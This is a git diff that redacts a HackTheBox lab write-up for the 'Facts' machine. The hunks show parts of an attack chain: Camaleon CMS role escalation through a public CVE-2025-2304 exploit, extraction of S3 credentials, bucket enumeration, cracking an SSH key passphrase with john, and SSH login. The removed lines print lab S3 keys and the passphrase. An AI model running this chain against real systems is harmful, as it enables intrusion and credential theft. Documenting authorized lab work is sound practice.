@@ -3,7 +3,7 @@
 > **Platform:** HackTheBox \
 > **Difficulty:** `Easy` \
 > **Date:** 2026-03-08 \
-> **Author:** 0N1S3C2 \
+> **Author:** 0N1S3C \
 > **Scope:** Authorized lab environment only
 
 ---
@@ -31,7 +31,7 @@ This report documents the structured analysis and controlled exploitation of the
 ```
 Nmap → Camaleon CMS admin registration → CVE-2025-2304 (mass assignment role escalation)
 → CVE-2025-2304 S3 credential extraction → AWS S3 enumeration → SSH key exfiltration
-→ John (dragonballz) → SSH as trivia → sudo facter --custom-dir → custom Ruby fact → Root
+→ John (passphrase crack) → SSH as trivia → sudo facter --custom-dir → custom Ruby fact → Root
 ```
 
 ---
@@ -59,7 +59,7 @@ Nmap → Camaleon CMS admin registration → CVE-2025-2304 (mass assignment role
 
 **Commands:**
 ```bash
-nmap -sC -sV -Pn -T4 10.129.1.168
+nmap -sC -sV -Pn -T4 <target-ip>
 ```
 
 **Findings:**
@@ -77,7 +77,7 @@ nmap -sC -sV -Pn -T4 10.129.1.168
 ### 4.2 Virtual Host Setup
 
 ```bash
-echo "10.129.1.168 facts.htb" | sudo tee -a /etc/hosts
+echo "<target-ip> facts.htb" | sudo tee -a /etc/hosts
 ```
 
 ---
@@ -126,7 +126,7 @@ The admin registration portal at `/admin/register` was publicly accessible. A ne
 ```bash
 git clone https://github.com/Alien0ne/CVE-2025-2304
 cd CVE-2025-2304
-python3 exploit.py -u http://facts.htb -U test -P test -e
+python3 exploit.py -u http://facts.htb -U <username> -P <password> -e
 ```
 
 **Output:**
@@ -134,8 +134,8 @@ python3 exploit.py -u http://facts.htb -U test -P test -e
 [+] Login confirmed — User ID: 5, Role: client
 [+] Updated User Role: admin
 [+] Extracting S3 Credentials
-    s3 access key: AKIAFD3692865DDD0590
-    s3 secret key: Li4sqxPUYrMjp/jnArM6o/oX+MulxKE7m3tMx7zJ
+    s3 access key: [REDACTED]
+    s3 secret key: [REDACTED]
     s3 endpoint:   http://localhost:54321
 ```
 
@@ -146,8 +146,8 @@ python3 exploit.py -u http://facts.htb -U test -P test -e
 Using the extracted credentials to enumerate the internal MinIO S3 instance:
 
 ```bash
-aws configure set aws_access_key_id AKIAFD3692865DDD0590
-aws configure set aws_secret_access_key Li4sqxPUYrMjp/jnArM6o/oX+MulxKE7m3tMx7zJ
+aws configure set aws_access_key_id [REDACTED]
+aws configure set aws_secret_access_key [REDACTED]
 
 aws s3 ls --endpoint-url http://facts.htb:54321
 # internal
@@ -167,7 +167,7 @@ The `internal` bucket was a backup of a user's home directory, containing an enc
 ```bash
 ssh2john id_ed25519 > hash.txt
 john hash.txt --wordlist=~/rockyou.txt
-# dragonballz (id_ed25519)
+# [REDACTED] (id_ed25519)
 ```
 
 ### 6.6 SSH Access
@@ -176,11 +176,13 @@ Username identified by reasoning from the box theme ("trivia" — box is named F
 
 ```bash
 chmod 600 id_ed25519
-ssh -i id_ed25519 trivia@10.129.1.168
-# passphrase: dragonballz
+ssh -i id_ed25519 trivia@<target-ip>
+# passphrase: [REDACTED]
 ```
 
 **Result:** User-level access obtained as `trivia`. User flag located at `/home/william/user.txt`.
+
+**User flag:** `[REDACTED]`
 
 ---
 
@@ -231,6 +233,8 @@ whoami  # root
 ```
 
 **Result:** Root shell obtained via SUID bash.
+
+**Root flag:** `[REDACTED]`
 
 ---
 
@@ -300,4 +304,7 @@ whoami  # root
 ---
 
 *End of Report*
-*Classification: Public — flags and sensitive values omitted*
+
+*Classification: Public (Redacted Version) — sensitive values redacted as this is an active HackTheBox machine*
+
+*Full version with flags and credentials will be published after box retirement*
